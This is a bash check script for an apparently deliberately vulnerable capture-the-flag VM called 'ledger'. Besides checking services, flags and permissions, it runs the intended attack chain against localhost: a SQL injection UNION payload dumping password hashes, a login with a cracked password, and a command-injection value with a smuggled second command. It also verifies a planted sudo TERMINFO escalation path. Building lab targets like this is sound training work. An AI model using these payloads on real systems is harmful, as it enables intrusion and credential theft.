#!/usr/bin/env bash
set -euo pipefail

failures=0

check() {
    local description="$1"
    shift
    if "$@" >/dev/null 2>&1; then
        printf '[OK]   %s\n' "${description}"
    else
        printf '[FAIL] %s\n' "${description}"
        failures=$((failures + 1))
    fi
}

is_md5_file() {
    [[ $(tr -d '\n' < "$1") =~ ^[0-9a-fA-F]{32}$ ]]
}

has_mode_owner() {
    [[ $(stat -c '%U:%G %a' "$1") == "$2" ]]
}

sudo_listing_works_for_mira() {
    local output
    output="$(runuser -u mira -- /usr/bin/sudo -n --list 2>&1)" || return 1
    grep -Fq '(root) NOPASSWD: /usr/local/sbin/ledger-backup' <<<"${output}"
}

sudo_accepts_terminal_metadata() {
    runuser -u mira -- /usr/bin/sudo -n TERMINFO=/home/mira/.terminfo \
        /usr/local/sbin/ledger-backup
}

web_chain_works() {
    (
    local cookie_file
    cookie_file="$(mktemp)"
    trap 'rm -f "${cookie_file}"' EXIT

    curl -fsS --get \
        -H 'Host: ledger.htb' \
        --data-urlencode "name=' UNION SELECT username,password_hash FROM users-- " \
        http://127.0.0.1/api/v1/directory/search | \
        grep -Eq 'reports-admin.*[0-9a-f]{64}'
    curl -fsS \
        -H 'Host: ledger.htb' \
        -c "${cookie_file}" \
        --data-urlencode 'username=reports-admin' \
        --data-urlencode 'password=sunshine' \
        http://127.0.0.1/login >/dev/null
    curl -fsS \
        -H 'Host: ledger.htb' \
        -b "${cookie_file}" \
        --data-urlencode 'host=127.0.0.1; printf LEDGER_RCE_CHECK' \
        http://127.0.0.1/admin/diagnostics | grep -q 'LEDGER_RCE_CHECK'
    )
}

check "hostname is ledger" test "$(hostname)" = ledger
check "ledger service is active" systemctl is-active --quiet ledger
check "nginx is active" systemctl is-active --quiet nginx
check "SSH is active" systemctl is-active --quiet ssh
check "no periodic player scrub is installed" sh -c "! systemctl list-unit-files ledger-scrub.timer --no-legend 2>/dev/null | grep -q '^ledger-scrub.timer'"
check "firewall is active" sh -c "ufw status | grep -q '^Status: active$'"
check "web app responds locally" curl -fsS -H 'Host: ledger.htb' http://127.0.0.1/
check "IP/default vhost redirects to ledger.htb" sh -c "test \"\$(curl -sS -o /dev/null -w '%{http_code} %{redirect_url}' http://127.0.0.1/)\" = '302 http://ledger.htb/'"
check "CSS asset is served" sh -c "curl -fsS -H 'Host: ledger.htb' http://127.0.0.1/static/style.css | grep -q 'Ledger\|color-scheme'"
check "careers page marks partner portal as external" sh -c "curl -fsS -H 'Host: ledger.htb' http://127.0.0.1/careers | grep -q 'nothing is hosted on this reporting machine'"
check "legacy status guides players to directory API" sh -c "curl -fsS -H 'Host: ledger.htb' http://127.0.0.1/api/v1/legacy/status | grep -q '/api/v1/directory/search'"
check "notices seeded the shared importer credential story" sh -c "curl -fsS -H 'Host: ledger.htb' http://127.0.0.1/service-notices | grep -q 'credential rotation pending'"
check "handbook points analysts at the nightly rotation" sh -c "curl -fsS -H 'Host: ledger.htb' http://127.0.0.1/handbook | grep -q 'night-operations maintenance script'"
check "backup script header tells the nightly story" sh -c "grep -q 'nightly maintenance snapshot' /usr/local/sbin/ledger-backup"
check "intended SQLi-hash-crack-to-command-injection chain works" web_chain_works
check "gunicorn is bound to loopback" sh -c "ss -ltn | grep -q '127.0.0.1:8000'"
check "only SSH and HTTP listen externally" sh -c "ss -ltnH | awk '{print \$4}' | grep -Ev '(^127\\.|^\\[::1\\]|:22$|:80$)' | grep -q . && exit 1 || exit 0"
check "user flag is MD5-shaped" is_md5_file /home/mira/user.txt
check "root flag is MD5-shaped" is_md5_file /root/root.txt
check "user flag ownership/mode" has_mode_owner /home/mira/user.txt 'root:mira 640'
check "root flag ownership/mode" has_mode_owner /root/root.txt 'root:root 640'
check "mira home matches username" test "$(getent passwd mira | cut -d: -f6)" = /home/mira
check "mira belongs to archive-ops" sh -c "id -nG mira | tr ' ' '\n' | grep -Fxq archive-ops"
check "mira password does not expire" sh -c "chage -l mira | grep -q 'Password expires.*never'"
check "temporary skip account is absent" sh -c "! id skip >/dev/null 2>&1"
check "temporary skip home is absent" test ! -e /home/skip
check "sudoers fragment is valid" visudo -cf /etc/sudoers.d/ledger-backup
check "mira can list the intended sudo rule" sudo_listing_works_for_mira
check "sudo accepts Mira's TERMINFO metadata" sudo_accepts_terminal_metadata
check "ledger configuration directory is listable" has_mode_owner /etc/ledger 'root:root 755'
check "archive profile is root-controlled and group-readable" has_mode_owner /etc/ledger/archive.conf 'root:archive-ops 640'
check "nightly queue is writable by archive-ops" has_mode_owner /var/spool/ledger/nightly 'root:archive-ops 770'
check "archive profile selects the nightly queue" grep -Fxq 'QUEUE_DIR=/var/spool/ledger/nightly' /etc/ledger/archive.conf
check "nightly queue contains only its seed report" sh -c "test \"$(find /var/spool/ledger/nightly -mindepth 1 -maxdepth 1 | wc -l)\" -eq 1 && test -f /var/spool/ledger/nightly/approved-q3-summary.txt"
check "report workspace contains only its seed report" sh -c "test \"$(find /opt/ledger/reports -mindepth 1 -maxdepth 1 | wc -l)\" -eq 1 && test -f /opt/ledger/reports/q3-summary.txt"
check "SQLite database belongs to ledger" has_mode_owner /opt/ledger/data/ledger.db 'ledger:ledger 640'
check "migration environment is protected" has_mode_owner /etc/ledger/ledger.env 'root:ledger 640'
check "mira secret is present in gunicorn environment" sh -c "pid=\$(pgrep -o -f 'gunicorn.*app:app'); tr '\0' '\n' < /proc/\$pid/environ | grep -q '^MIRA_IMPORT_PASSWORD='"
check "root SSH login is disabled" sh -c "sshd -T | grep -q '^permitrootlogin no$'"
check "only mira may use SSH after finalization" sh -c "sshd -T | grep -q '^allowusers mira$'"
check "systemd-networkd uses DHCP" grep -Eq '^DHCP=(ipv4|yes)$' /etc/systemd/network/10-ledger-dhcp.network
check "network config has no fixed IPv4 address" sh -c "! grep -Eq '^(Address|Gateway)=' /etc/systemd/network/10-ledger-dhcp.network"
check "netplan YAML is absent" sh -c "! find /etc/netplan -maxdepth 1 -type f -name '*.yaml' -print -quit 2>/dev/null | grep -q ."
check "locale is en_US.UTF-8" sh -c "locale | grep -q '^LANG=en_US.UTF-8$'"
check "UFW allows SSH" sh -c "ufw status | grep -Eq '22/tcp.*ALLOW'"
check "UFW allows HTTP" sh -c "ufw status | grep -Eq '80/tcp.*ALLOW'"
check "provisioning sources removed" sh -c "! find /home /opt /root /tmp -type f -path '*/easy-linux/provision/install.sh' -print -quit 2>/dev/null | grep -q ."

if ((failures > 0)); then
    printf '\n%d check(s) failed.\n' "${failures}" >&2
    exit 1
fi

echo "All automated VM checks passed."

